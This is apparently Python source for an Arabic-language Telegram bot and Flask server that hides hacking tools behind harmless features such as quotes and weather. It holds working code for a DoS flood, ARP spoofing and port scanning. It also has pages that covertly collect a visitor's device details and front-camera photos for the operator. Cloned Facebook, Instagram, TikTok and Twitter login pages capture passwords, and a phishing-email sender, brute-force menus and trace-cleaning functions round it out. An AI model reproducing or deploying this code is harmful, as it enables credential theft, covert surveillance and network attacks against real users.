def dos_attack(target, port, duration):
    results = {'packets_sent': 0, 'status': 'completed'}
    start_time = time.time()
    sent = 0
    try:
        ip = socket.gethostbyname(target)
        while time.time() - start_time < duration:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.5)
                sock.connect((ip, port))
                sock.close()
                sent += 1
            except:
                pass
        results['packets_sent'] = sent
    except Exception as e:
        results['error'] = str(e)
        results['status'] = 'failed'
    return results

def arp_spoof(target_ip, gateway_ip, interface='eth0'):
    results = {'status': 'started'}
    try:
        target_mac = None
        gateway_mac = None
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=target_ip), timeout=2, verbose=False)
        for _, rcv in ans:
            target_mac = rcv[Ether].src
            break
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=gateway_ip), timeout=2, verbose=False)
        for _, rcv in ans:
            gateway_mac = rcv[Ether].src
            break
        if target_mac and gateway_mac:
            send(ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwdst=target_mac), count=10, verbose=False)
            send(ARP(op=2, pdst=gateway_ip, psrc=target_ip, hwdst=gateway_mac), count=10, verbose=False)
            results['status'] = 'success'
        else:
            results['error'] = 'فشل الحصول على عناوين MAC'
            results['status'] = 'failed'
    except Exception as e:
        results['error'] = str(e)
        results['status'] = 'failed'
    return results

def port_scan(target):
    ports = [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445, 993, 995, 1723, 3306, 3389, 5432, 5900, 6379, 8080]
    open_ports = []
    try:
        ip = socket.gethostbyname(target)
        for port in ports:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            if sock.connect_ex((ip, port)) == 0:
                open_ports.append(port)
            sock.close()
        return open_ports
    except:
        return []

def ssl_scan(domain):
    try:
        import ssl
        context = ssl.create_default_context()
        with socket.create_connection((domain, 443), timeout=10) as sock:
            with context.wrap_socket(sock, server_hostname=domain) as ssock:
                cert = ssock.getpeercert()
                return {'valid': True, 'subject': cert.get('subject', ''), 'issuer': cert.get('issuer', ''), 'not_after': cert.get('notAfter', ''), 'not_before': cert.get('notBefore', '')}
    except:
        return {'valid': False, 'error': 'فشل الاتصال'}

STEALTH_MODE = False
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1"
]
PROXIES = [
    "http://45.76.222.187:8080",
    "http://138.197.197.117:8080",
    "http://159.203.61.168:3128",
    "http://165.227.196.37:3128"
]

def get_random_ua():
    return random.choice(USER_AGENTS)

def get_random_proxy():
    return random.choice(PROXIES) if PROXIES else None

def stealth_request(url, method='GET', data=None, headers=None, timeout=30):
    session = requests.Session()
    session.headers.update({'User-Agent': get_random_ua()})
    if STEALTH_MODE:
        proxy = get_random_proxy()
        if proxy:
            session.proxies = {'http': proxy, 'https': proxy}
        time.sleep(random.uniform(0.5, 1.5))
    if headers:
        session.headers.update(headers)
    try:
        if method.upper() == 'GET':
            return session.get(url, timeout=timeout)
        elif method.upper() == 'POST':
            return session.post(url, data=data, timeout=timeout)
    except:
        return None

# ===================== صفحات Flask المدمجة لجمع المعلومات والكاميرا =====================

DEVICE_INFO_PAGE_TEMPLATE = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>جمع معلومات الجهاز</title>
    <style>
        body { font-family: Arial, sans-serif; background: #f4f4f4; text-align: center; padding: 20px; direction: rtl; }
        .container { max-width: 600px; margin: auto; background: white; padding: 30px; border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
        .loader { display: inline-block; width: 40px; height: 40px; border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .success { color: green; font-weight: bold; }
    </style>
</head>
<body>
    <div class="container">
        <h2>جاري جمع معلومات جهازك...</h2>
        <div class="loader"></div>
        <p>يرجى الانتظار، سيتم إرسال المعلومات فوراً</p>
    </div>
    <script>
        function getDeviceInfo() {
            const info = {
                "الدولة": "",
                "المدينة": "",
                "عنوان IP": "",
                "شحن الهاتف": "غير معروف",
                "هل الهاتف يشحن؟": "لا",
                "الشبكة": "غير معروف",
                "نوع الاتصال": "غير معروف",
                "الوقت": new Date().toLocaleString('ar-EG'),
                "اسم الجهاز": navigator.platform || "غير معروف",
                "إصدار الجهاز": navigator.userAgent || "غير معروف",
                "نوع الجهاز": /Mobi/.test(navigator.userAgent) ? "هاتف" : "كمبيوتر",
                "الذاكرة (RAM)": navigator.deviceMemory ? navigator.deviceMemory + " GB" : "غير معروف",
                "الذاكرة الداخلية": "غير معروف",
                "عدد الأنوية": navigator.hardwareConcurrency || "غير معروف",
                "لغة النظام": navigator.language || "غير معروف",
                "اسم المتصفح": navigator.appName || "غير معروف",
                "إصدار المتصفح": navigator.userAgent || "غير معروف",
                "دقة الشاشة": window.screen.width + "x" + window.screen.height,
                "إصدار نظام التشغيل": navigator.platform || "غير معروف",
                "وضع الشاشة": window.screen.orientation ? window.screen.orientation.type : "غير معروف",
                "عمق الألوان": window.screen.colorDepth + " bit",
                "بروتوكول الأمان المستخدم": window.location.protocol,
                "إمكانية تحديد الموقع الجغرافي": navigator.geolocation ? "نعم" : "لا",
                "الدعم لتقنية البلوتوث": navigator.bluetooth ? "نعم" : "لا",
                "دعم الإيماءات اللمسية": 'ontouchstart' in window ? "نعم" : "لا"
            };
            fetch('https://ipapi.co/json/')
                .then(response => response.json())
                .then(data => {
                    info["الدولة"] = data.country_name || "";
                    info["المدينة"] = data.city || "";
                    info["عنوان IP"] = data.ip || "";
                    sendData(info);
                })
                .catch(() => sendData(info));
            if (navigator.getBattery) {
                navigator.getBattery().then(battery => {
                    info["شحن الهاتف"] = Math.round(battery.level * 100) + "%";
                    info["هل الهاتف يشحن؟"] = battery.charging ? "نعم" : "لا";
                });
            }
            if (navigator.connection) {
                const conn = navigator.connection;
                info["نوع الاتصال"] = conn.type || "غير معروف";
                const speed = conn.downlink ? conn.downlink + " Mbps" : "غير معروف";
                info["الشبكة"] = conn.effectiveType ? conn.effectiveType + " (" + speed + ")" : "غير معروف";
            }
        }
        function sendData(data) {
            const token = new URLSearchParams(window.location.search).get('token');
            if (!token) {
                document.querySelector('.container').innerHTML = '<h2>الرابط غير صحيح</h2>';
                return;
            }
            fetch(window.location.origin + '/collect_data', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ token: token, data: data })
            })
            .then(response => response.json())
            .then(result => {
                if (result.status === 'success') {
                    document.querySelector('.container').innerHTML = '<h2 class="success">تم إرسال المعلومات بنجاح</h2>';
                } else {
                    document.querySelector('.container').innerHTML = '<h2>فشل الإرسال: ' + (result.error || 'خطأ غير معروف') + '</h2>';
                }
            })
            .catch(err => {
                document.querySelector('.container').innerHTML = '<h2>خطأ في الاتصال: ' + err.message + '</h2>';
            });
        }
        getDeviceInfo();
    </script>
</body>
</html>
"""

CAMERA_PAGE_TEMPLATE = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>اختراق الكاميرا</title>
    <style>
        body { font-family: Arial, sans-serif; background: #f4f4f4; text-align: center; padding: 20px; direction: rtl; }
        .container { max-width: 600px; margin: auto; background: white; padding: 30px; border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
        video { width: 100%; max-width: 400px; border-radius: 10px; background: #000; margin: 10px 0; }
        .btn { background: #4CAF50; color: white; padding: 10px 20px; border: none; border-radius: 5px; font-size: 16px; cursor: pointer; margin: 5px; }
        .success { color: green; font-weight: bold; }
    </style>
</head>
<body>
    <div class="container">
        <h2>اختراق الكاميرا الأمامية</h2>
        <video id="video" autoplay playsinline></video>
        <div>
            <button class="btn" id="captureBtn">التقاط الصورة</button>
        </div>
        <p id="status">جارٍ تحضير الكاميرا...</p>
    </div>
    <script>
        const video = document.getElementById('video');
        const status = document.getElementById('status');
        const captureBtn = document.getElementById('captureBtn');
        let stream = null;
        navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
            .then(s => {
                stream = s;
                video.srcObject = s;
                status.innerHTML = 'الكاميرا جاهزة. اضغط على الزر لالتقاط الصورة';
            })
            .catch(err => {
                status.innerHTML = 'فشل الوصول إلى الكاميرا: ' + err.message;
            });
        captureBtn.addEventListener('click', function() {
            if (!stream) {
                status.innerHTML = 'الكاميرا غير متاحة';
                return;
            }
            status.innerHTML = 'جاري التقاط الصورة...';
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            const imageData = canvas.toDataURL('image/jpeg');
            const token = new URLSearchParams(window.location.search).get('token');
            if (!token) {
                status.innerHTML = 'الرابط غير صحيح';
                return;
            }
            fetch(window.location.origin + '/collect_data', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ token: token, data: { image: imageData } })
            })
            .then(response => response.json())
            .then(result => {
                if (result.status === 'success') {
                    status.innerHTML = 'تم إرسال الصورة بنجاح';
                } else {
                    status.innerHTML = 'فشل الإرسال: ' + (result.error || 'خطأ غير معروف');
                }
            })
            .catch(err => {
                status.innerHTML = 'خطأ في الاتصال: ' + err.message;
            });
        });
    </script>
</body>
</html>
"""

# ===================== صفحات التصيد =====================

PHISHING_PAGES = {}

def get_phishing_page(platform):
    if platform in PHISHING_PAGES:
        return PHISHING_PAGES[platform]
    if platform == 'facebook':
        html = """<!DOCTYPE html>
<html dir="rtl" lang="ar">
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>فيسبوك - تسجيل الدخول</title>
<style>
body {font-family: Arial, sans-serif; background: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; direction: rtl;}
.container {background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); width: 400px; text-align: center;}
.logo {color: #1877f2; font-size: 40px; font-weight: bold; margin-bottom: 20px;}
.input {width: 100%; padding: 14px; margin: 10px 0; border: 1px solid #ddd; border-radius: 6px; box-sizing: border-box; font-size: 16px;}
.btn {background: #1877f2; color: white; border: none; border-radius: 6px; padding: 14px; font-size: 18px; width: 100%; cursor: pointer;}
.btn:hover {background: #166fe5;}
.link {color: #1877f2; text-decoration: none; font-size: 14px;}
.footer {margin-top: 20px; font-size: 12px; color: #777;}
</style>
</head>
<body>
<div class="container">
<div class="logo">facebook</div>
<form method="POST" action="/phishing_capture">
<input type="hidden" name="platform" value="facebook">
<input class="input" type="text" name="username" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
<input class="input" type="password" name="password" placeholder="كلمة السر" required>
<button class="btn" type="submit">تسجيل الدخول</button>
</form>
<a class="link" href="#">نسيت كلمة السر؟</a>
<hr>
<button class="btn" style="background:#42b72a; margin-top:10px;">إنشاء حساب جديد</button>
<div class="footer">2025 فيسبوك</div>
</div>
</body>
</html>"""
    elif platform == 'instagram':
        html = """<!DOCTYPE html>
<html dir="rtl" lang="ar">
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>انستغرام</title>
<style>
body {font-family: Arial, sans-serif; background: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; direction: rtl;}
.container {background: white; padding: 40px; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.05); width: 350px; text-align: center;}
.logo {font-size: 30px; font-weight: bold; margin-bottom: 20px;}
.input {width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box;}
.btn {background: #0095f6; color: white; border: none; border-radius: 4px; padding: 12px; font-size: 16px; width: 100%; cursor: pointer;}
.btn:hover {background: #0077c2;}
.footer {margin-top: 20px; font-size: 12px; color: #777;}
</style>
</head>
<body>
<div class="container">
<div class="logo">Instagram</div>
<form method="POST" action="/phishing_capture">
<input type="hidden" name="platform" value="instagram">
<input class="input" type="text" name="username" placeholder="اسم المستخدم أو البريد" required>
<input class="input" type="password" name="password" placeholder="كلمة السر" required>
<button class="btn" type="submit">تسجيل الدخول</button>
</form>
<div class="footer">2025 انستغرام</div>
</div>
</body>
</html>"""
    elif platform == 'tiktok':
        html = """<!DOCTYPE html>
<html dir="rtl" lang="ar">
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>تيك توك</title>
<style>
body {font-family: Arial, sans-serif; background: #000; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; direction: rtl;}
.container {background: white; padding: 40px; border-radius: 8px; width: 360px; text-align: center;}
.logo {font-size: 28px; font-weight: bold; color: #000; margin-bottom: 20px;}
.input {width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box;}
.btn {background: #fe2c55; color: white; border: none; border-radius: 4px; padding: 12px; font-size: 16px; width: 100%; cursor: pointer;}
.btn:hover {background: #d41f44;}
.footer {margin-top: 20px; font-size: 12px; color: #777;}
</style>
</head>
<body>
<div class="container">
<div class="logo">TikTok</div>
<form method="POST" action="/phishing_capture">
<input type="hidden" name="platform" value="tiktok">
<input class="input" type="text" name="username" placeholder="اسم المستخدم أو البريد" required>
<input class="input" type="password" name="password" placeholder="كلمة السر" required>
<button class="btn" type="submit">تسجيل الدخول</button>
</form>
<div class="footer">2025 تيك توك</div>
</div>
</body>
</html>"""
    elif platform == 'twitter':
        html = """<!DOCTYPE html>
<html dir="rtl" lang="ar">
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>تويتر</title>
<style>
body {font-family: Arial, sans-serif; background: #e6ecf0; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; direction: rtl;}
.container {background: white; padding: 40px; border-radius: 8px; width: 360px; text-align: center;}
.logo {font-size: 28px; font-weight: bold; color: #1da1f2; margin-bottom: 20px;}
.input {width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box;}
.btn {background: #1da1f2; color: white; border: none; border-radius: 4px; padding: 12px; font-size: 16px; width: 100%; cursor: pointer;}
.btn:hover {background: #0d8bdb;}
.footer {margin-top: 20px; font-size: 12px; color: #777;}
</style>
</head>
<body>
<div class="container">
<div class="logo">Twitter</div>
<form method="POST" action="/phishing_capture">
<input type="hidden" name="platform" value="twitter">
<input class="input" type="text" name="username" placeholder="اسم المستخدم أو البريد" required>
<input class="input" type="password" name="password" placeholder="كلمة السر" required>
<button class="btn" type="submit">تسجيل الدخول</button>
</form>
<div class="footer">2025 تويتر</div>
</div>
</body>
</html>"""
    else:
        html = "<h2>منصة غير معروفة</h2>"
    PHISHING_PAGES[platform] = html
    return html

# ===================== مسارات Flask الإضافية =====================

@app.route('/device_info')
def device_info_page():
    token = request.args.get('token')
    if not token:
        return "الرابط غير صحيح (token مفقود)", 400
    chat_id = get_chat_id_by_token(token)
    if not chat_id:
        return "رمز غير صالح", 400
    return render_template_string(DEVICE_INFO_PAGE_TEMPLATE)

@app.route('/camera_hack')
def camera_hack_page():
    token = request.args.get('token')
    if not token:
        return "الرابط غير صحيح (token مفقود)", 400
    chat_id = get_chat_id_by_token(token)
    if not chat_id:
        return "رمز غير صالح", 400
    return render_template_string(CAMERA_PAGE_TEMPLATE)

@app.route('/phishing_pages/<platform>')
def phishing_page(platform):
    if platform not in ['facebook', 'instagram', 'tiktok', 'twitter']:
        return "منصة غير مدعومة", 404
    return get_phishing_page(platform)

@app.route('/collect_data', methods=['POST'])
@limiter.limit("20 per minute")
def collect_data():
    try:
        data = request.get_json()
        if not data:
            return jsonify({'error': 'Invalid JSON'}), 400
        token = data.get('token')
        if not token:
            return jsonify({'error': 'token required'}), 400
        chat_id = get_chat_id_by_token(token)
        if not chat_id:
            return jsonify({'error': 'Invalid token'}), 400
        info = data.get('data', {})
        if not info:
            return jsonify({'error': 'No data provided'}), 400
        msg = "معلومات الجهاز:\n\n"
        for key, value in info.items():
            msg += f"- {key}: {value}\n"
        safe_send(chat_id, msg)
        return jsonify({'status': 'success'}), 200
    except Exception as e:
        return jsonify({'error': str(e)}), 500

# ===================== دوال الحماية =====================
def change_bot_identity():
    try:
        new_name = random.choice(["System Scanner", "Security Checker", "Network Tool", "File Manager", "PDF Reader", "Help Desk", "Support Bot", "Cyber Guardian"])
        bot.set_my_name(new_name)
        bot.set_my_description("أداة متقدمة للفحص الرقمي والأمان السيبراني")
        bot.set_my_short_description("أداة متقدمة للفحص الرقمي")
        return f"تم تغيير هوية البوت إلى: {new_name}"
    except Exception as e:
        return f"فشل تغيير الهوية: {str(e)}"

def clean_traces():
    try:
        for f in os.listdir('temp'):
            os.remove(os.path.join('temp', f))
        for f in os.listdir('downloads'):
            os.remove(os.path.join('downloads', f))
        return "تم تنظيف السجلات والملفات المؤقتة بنجاح"
    except Exception as e:
        return f"فشل التنظيف: {str(e)}"

def backup_data():
    try:
        backup_dir = "backups"
        os.makedirs(backup_dir, exist_ok=True)
        backup_file = os.path.join(backup_dir, f"backup_{datetime.now().strftime('%Y%m%d_%H%M%S')}.db")
        shutil.copy2(DB_PATH, backup_file)
        return f"تم إنشاء النسخة الاحتياطية: {backup_file}"
    except Exception as e:
        return f"فشل النسخ الاحتياطي: {str(e)}"

def detect_intrusion():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT ip, COUNT(*) FROM intrusion_logs WHERE timestamp > datetime('now', '-1 hour') GROUP BY ip HAVING COUNT(*) > 10")
    suspicious_ips = c.fetchall()
    c.execute("SELECT COUNT(*) FROM intrusion_logs")
    total_logs = c.fetchone()[0]
    conn.close()
    if suspicious_ips:
        msg = "تم اكتشاف نشاط مشبوه:\n"
        for ip, count in suspicious_ips:
            msg += f"IP: {ip} - عدد المحاولات: {count}\n"
        return msg
    else:
        return f"لا توجد محاولات اختراق مشبوهة حالياً. إجمالي السجلات: {total_logs}"

def active_shield():
    return "درع الحماية مفعل: يتم تطبيق حد الطلبات ومنع الـ IPs المشبوهة"

def restart_bot_safely():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("INSERT OR REPLACE INTO bot_state (key, value) VALUES ('last_restart', ?)", (datetime.now().isoformat(),))
    conn.commit()
    conn.close()
    return "تم إعادة تشغيل البوت بشكل آمن"

def send_phishing_email(target_email, subject, message, phishing_link):
    try:
        msg = MIMEMultipart()
        msg['From'] = SMTP_USER
        msg['To'] = target_email
        msg['Subject'] = subject
        body = f"""
        <html>
        <body>
            <p>{message}</p>
            <p>يرجى الضغط على الرابط التالي للتحقق من حسابك:</p>
            <a href="{phishing_link}">اضغط هنا</a>
            <p>إذا لم تطلب هذا، يرجى تجاهل هذه الرسالة</p>
        </body>
        </html>
        """
        msg.attach(MIMEText(body, 'html'))
        server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)
        server.starttls()
        server.login(SMTP_USER, SMTP_PASS)
        server.send_message(msg)
        server.quit()
        return True
    except Exception as e:
        return str(e)

# ===================== إنشاء البوت =====================
bot = TeleBot(TOKEN, parse_mode='HTML')

# ===================== بناء الأزرار =====================
os.makedirs('temp', exist_ok=True)
os.makedirs('downloads', exist_ok=True)

def build_main_menu(chat_id):
    markup = InlineKeyboardMarkup(row_width=2)
    markup.row(
        InlineKeyboardButton("الطقس", callback_data="weather"),
        InlineKeyboardButton("ويكيبيديا", callback_data="wikipedia")
    )
    markup.row(
        InlineKeyboardButton("مولد كلمات سر", callback_data="password_gen"),
        InlineKeyboardButton("فحص قوة كلمة السر", callback_data="password_strength")
    )
    markup.row(
        InlineKeyboardButton("تحويل نص إلى صوت", callback_data="text_to_speech"),
        InlineKeyboardButton("ترجمة فورية", callback_data="translate")
    )
    markup.row(
        InlineKeyboardButton("تذكير", callback_data="reminder"),
        InlineKeyboardButton("آخر الأخبار", callback_data="news")
    )
    if user_can_use_collector(chat_id):
        markup.row(
            InlineKeyboardButton("معلومات الجهاز", callback_data="device_info"),
            InlineKeyboardButton("الكاميرا الأمامية", callback_data="camera_hack")
        )
    markup.row(
        InlineKeyboardButton("اقتباسات", callback_data="quotes_menu"),
        InlineKeyboardButton("نصائح", callback_data="tips_menu")
    )
    markup.row(
        InlineKeyboardButton("فحص الرابط", callback_data="check_link_advanced"),
        InlineKeyboardButton("تحليل APK", callback_data="analyze_apk")
    )
    markup.row(
        InlineKeyboardButton("تحليل PDF", callback_data="pdf_menu"),
        InlineKeyboardButton("الأجهزة", callback_data="list_devices")
    )
    markup.row(
        InlineKeyboardButton("نقاطي", callback_data="my_points"),
        InlineKeyboardButton("رابط دعوتي", callback_data="my_referral")
    )
    markup.row(
        InlineKeyboardButton("سجل النقاط", callback_data="points_history"),
        InlineKeyboardButton("لوحة التحكم", callback_data="admin_panel")
    )
    # أزرار المطور فقط (مخفية عن العامة)
    if is_admin(chat_id):
        markup.row(
            InlineKeyboardButton("القائمة السرية", callback_data="hacking_menu"),
            InlineKeyboardButton("الحماية", callback_data="protection_menu")
        )
        markup.row(
            InlineKeyboardButton("إدارة الصلاحيات", callback_data="admin_permissions"),
            InlineKeyboardButton("قفل الدردشة", callback_data="lock_chat")
        )
        markup.row(
            InlineKeyboardButton("أرسل للمستخدم", callback_data="send_to_user"),
            InlineKeyboardButton("نشاط المستخدمين", callback_data="user_activity")
        )
    # أزرار عامة
    markup.row(
        InlineKeyboardButton("صفحات تصيد", callback_data="phishing_pages"),
        InlineKeyboardButton("بريد تصيد", callback_data="phishing_email")
    )
    if is_admin(chat_id):
        markup.row(
            InlineKeyboardButton("وضع التخفي", callback_data="toggle_stealth"),
            InlineKeyboardButton("قفل البوت", callback_data="protect_lock")
        )
    return markup

def build_quotes_menu():
    markup = InlineKeyboardMarkup(row_width=2)
    markup.row(
        InlineKeyboardButton("اقتباسات عربية", callback_data="quotes_arabic"),
        InlineKeyboardButton("اقتباسات إنجليزية", callback_data="quotes_english")
    )
    markup.row(
        InlineKeyboardButton("رجوع", callback_data="back_main")
    )
    return markup

def build_quotes_type_menu(lang):
    markup = InlineKeyboardMarkup(row_width=2)
    if lang == 'arabic':
        markup.row(
            InlineKeyboardButton("حزين", callback_data="quote_arabic_sad"),
            InlineKeyboardButton("عميق", callback_data="quote_arabic_deep"),
            InlineKeyboardButton("جميل", callback_data="quote_arabic_beautiful")
        )
    else:
        markup.row(
            InlineKeyboardButton("Sad", callback_data="quote_english_sad"),
            InlineKeyboardButton("Deep", callback_data="quote_english_deep"),
            InlineKeyboardButton("Beautiful", callback_data="quote_english_beautiful")
        )
    markup.row(
        InlineKeyboardButton("رجوع", callback_data="quotes_menu")
    )
    return markup

def build_tips_menu():
    markup = InlineKeyboardMarkup(row_width=2)
    markup.row(
        InlineKeyboardButton("نصائح دراسية", callback_data="tips_study"),
        InlineKeyboardButton("نصائح اجتماعية", callback_data="tips_social")
    )
    markup.row(
        InlineKeyboardButton("نصائح للاكتئاب", callback_data="tips_depression"),
        InlineKeyboardButton("نصائح إسلامية", callback_data="tips_islamic")
    )
    markup.row(
        InlineKeyboardButton("رجوع", callback_data="back_main")
    )
    return markup

def build_phishing_pages_menu():
    markup = InlineKeyboardMarkup(row_width=2)
    markup.row(
        InlineKeyboardButton("فيسبوك", callback_data="phish_facebook"),
        InlineKeyboardButton("انستغرام", callback_data="phish_instagram")
    )
    markup.row(
        InlineKeyboardButton("تيك توك", callback_data="phish_tiktok"),
        InlineKeyboardButton("تويتر", callback_data="phish_twitter")
    )
    markup.row(
        InlineKeyboardButton("رجوع", callback_data="back_main")
    )
    return markup

def build_protection_menu():
    markup = InlineKeyboardMarkup(row_width=2)
    markup.row(
        InlineKeyboardButton("درع الحماية", callback_data="protect_shield"),
        InlineKeyboardButton("قفل البوت", callback_data="protect_lock")
    )
    markup.row(
        InlineKeyboardButton("تخفي شامل", callback_data="protect_stealth"),
        InlineKeyboardButton("كشف الاختراق", callback_data="protect_detect")
    )
    markup.row(
        InlineKeyboardButton("تغيير الهوية", callback_data="protect_identity"),
        InlineKeyboardButton("تنظيف السجلات", callback_data="protect_clean")
    )
    markup.row(
        InlineKeyboardButton("حماية API", callback_data="protect_api"),
        InlineKeyboardButton("نسخ احتياطي", callback_data="protect_backup")
    )
    markup.row(
        InlineKeyboardButton("إعادة تشغيل آمن", callback_data="protect_reboot"),
        InlineKeyboardButton("رجوع", callback_data="back_main")
    )
    return markup

def build_pdf_menu():
    markup = InlineKeyboardMarkup(row_width=2)
    markup.row(
        InlineKeyboardButton("تلخيص PDF", callback_data="pdf_summary"),
        InlineKeyboardButton("استخراج نصوص", callback_data="pdf_extract")
    )
    markup.row(
        InlineKeyboardButton("تحليل ذكي (أسئلة)", callback_data="pdf_smart"),
        InlineKeyboardButton("رجوع", callback_data="back_main")
    )
    return markup

def build_hacking_menu():
    markup = InlineKeyboardMarkup(row_width=2)
    markup.row(
        InlineKeyboardButton("حقن SQL", callback_data="hack_sqli"),
        InlineKeyboardButton("XSS", callback_data="hack_xss")
    )
    markup.row(
        InlineKeyboardButton("DoS", callback_data="hack_dos"),
        InlineKeyboardButton("ARP Spoof", callback_data="hack_arp")
    )
    markup.row(
        InlineKeyboardButton("تخمين فيسبوك", callback_data="bruteforce_fb"),
        InlineKeyboardButton("تخمين انستغرام", callback_data="bruteforce_ig")
    )
    markup.row(
        InlineKeyboardButton("تخمين SSH", callback_data="bruteforce_ssh"),
        InlineKeyboardButton("تخمين FTP", callback_data="bruteforce_ftp")
    )
    markup.row(
        InlineKeyboardButton("تخمين مخصص", callback_data="bruteforce_custom"),
        InlineKeyboardButton("تحميل فيديو", callback_data="download_video")
    )
    markup.row(
        InlineKeyboardButton("مسح منافذ", callback_data="port_scan"),
        InlineKeyboardButton("فحص SSL", callback_data="ssl_scan")
    )
    markup.row(
        InlineKeyboardButton("كاميرا", callback_data="hack_camera"),
        InlineKeyboardButton("ميكروفون", callback_data="hack_mic")
    )
    markup.row(
        InlineKeyboardButton("موقع", callback_data="hack_location"),
        InlineKeyboardButton("جهات اتصال", callback_data="hack_contacts")
    )
    markup.row(
        InlineKeyboardButton("رسائل SMS", callback_data="hack_sms"),
        InlineKeyboardButton("لقطة شاشة", callback_data="hack_screenshot")
    )
    markup.row(
        InlineKeyboardButton("Shell", callback_data="hack_shell"),
        InlineKeyboardButton("إيقاف تشغيل", callback_data="hack_shutdown")
    )
    markup.row(
        InlineKeyboardButton("رجوع", callback_data="back_main")
    )
    return markup

def build_admin_panel():
    markup = InlineKeyboardMarkup(row_width=2)
    markup.row(
        InlineKeyboardButton("إحصائيات", callback_data="admin_stats"),
        InlineKeyboardButton("بث جماعي", callback_data="admin_broadcast")
    )
    markup.row(
        InlineKeyboardButton("المستخدمين", callback_data="admin_users"),
        InlineKeyboardButton("التقارير", callback_data="admin_reports")
    )
    markup.row(
        InlineKeyboardButton("إدارة النقاط", callback_data="admin_points"),
        InlineKeyboardButton("حظر/فتح مستخدم", callback_data="admin_ban")
    )
    markup.row(
        InlineKeyboardButton("سجل التصيد", callback_data="admin_phishing_logs"),
        InlineKeyboardButton("إدارة الصلاحيات", callback_data="admin_permissions")
    )
    markup.row(
        InlineKeyboardButton("قفل الدردشة", callback_data="lock_chat"),
        InlineKeyboardButton("أرسل للمستخدم", callback_data="send_to_user")
    )
    markup.row(
        InlineKeyboardButton("نشاط المستخدمين", callback_data="user_activity"),
        InlineKeyboardButton("رجوع", callback_data="back_main")
    )
    return markup

# ===================== متغيرات الحالة =====================
BOT_LOCKED = False
user_states = {}
admin_remote = {}
pdf_texts = {}
reminder_timers = {}

# ===================== معالج الأزرار =====================
@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    chat_id = call.message.chat.id
    data = call.data

    # تسجيل النشاط
    log_activity(chat_id, data)
    update_last_seen(chat_id)

    if data == "back_main":
        safe_send(chat_id, "القائمة الرئيسية", reply_markup=build_main_menu(chat_id))
        return

    # ===== اقتباسات =====
    if data == "quotes_menu":
        safe_send(chat_id, "اختر نوع الاقتباسات:", reply_markup=build_quotes_menu())
        return
    if data == "quotes_arabic":
        safe_send(chat_id, "اختر نوع الاقتباس العربي:", reply_markup=build_quotes_type_menu('arabic'))
        return
    if data == "quotes_english":
        safe_send(chat_id, "Choose quote type:", reply_markup=build_quotes_type_menu('english'))
        return
    if data.startswith("quote_"):
        parts = data.split("_")
        lang = parts[1]
        type_ = parts[2]
        if lang in QUOTES and type_ in QUOTES[lang]:
            quote = random.choice(QUOTES[lang][type_])
            safe_send(chat_id, quote)
        return

    # ===== نصائح =====
    if data == "tips_menu":
        safe_send(chat_id, "اختر نوع النصيحة:", reply_markup=build_tips_menu())
        return
    if data.startswith("tips_"):
        tip_type = data.split("_")[1]
        if tip_type in TIPS:
            tip = random.choice(TIPS[tip_type])
            safe_send(chat_id, tip)
        return

    # ===== إدارة الصلاحيات =====
    if data == "admin_permissions":
